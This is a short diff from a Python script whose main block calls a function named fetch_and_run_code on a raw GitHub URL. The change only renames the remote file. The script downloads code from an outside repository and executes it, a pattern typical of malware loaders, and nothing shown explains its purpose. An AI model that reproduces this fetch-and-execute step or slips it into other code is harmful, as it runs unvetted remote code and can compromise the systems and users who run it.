@@ -17,6 +17,6 @@ def fetch_and_run_code(url):
 
 if __name__ == "__main__":
     load()
-    url = "https://raw.githubusercontent.com/Aldoriahub/Gg/refs/heads/main/Soon.py"
+    url = "https://raw.githubusercontent.com/Aldoriahub/Gg/refs/heads/main/Soon"
     fetch_and_run_code(url)
 
